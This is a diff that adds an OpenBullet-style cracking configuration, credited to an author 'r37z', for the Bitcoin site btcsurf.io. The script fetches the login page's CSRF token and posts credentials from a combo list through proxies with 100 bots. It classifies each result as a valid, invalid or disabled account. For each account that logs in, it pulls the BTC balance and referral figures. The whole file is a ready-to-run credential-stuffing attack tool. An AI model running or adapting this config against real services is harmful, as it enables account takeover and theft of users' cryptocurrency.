@@ -1,0 +1,90 @@
+[SETTINGS]
+{
+  "Name": "btcsurf.io",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-25T00:29:02.6741064+02:00",
+  "AdditionalInfo": "",
+  "Author": "r37z",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://btcsurf.io/login" 
+  
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: btcsurf.io" 
+  HEADER "Origin: https://btcsurf.io" 
+  HEADER "Referer: https://btcsurf.io/login" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+
+PARSE "<SOURCE>" LR "<input name=\"_token\" type=\"hidden\" value=\"" "\">" -> VAR "token" 
+
+REQUEST POST "https://btcsurf.io/login" 
+  CONTENT "_token=<token>&email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: btcsurf.io" 
+  HEADER "Origin: https://btcsurf.io" 
+  HEADER "Referer: https://btcsurf.io/login" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Account disabled." 
+  KEYCHAIN Failure OR 
+    KEY "These credentials do not match our records." 
+  KEYCHAIN Success OR 
+    KEY "SEE SURF" 
+
+PARSE "<SOURCE>" LR " <i class=\"material-icons\">star</i>" "</a>" -> CAP "Membershop" 
+
+REQUEST GET "https://btcsurf.io/backoffice/charts/getBalanceData" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: btcsurf.io" 
+  HEADER "Origin: https://btcsurf.io" 
+  HEADER "Referer: https://btcsurf.io/login" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+PARSE "<SOURCE>" JSON "total" -> CAP "Balance" "" " BTC" 
+
+PARSE "<SOURCE>" JSON "refers_amount" -> CAP "Referrals" "" " " 
+
+PARSE "<SOURCE>" JSON "refers_porcent" -> CAP "Ref %" "" " " 
+
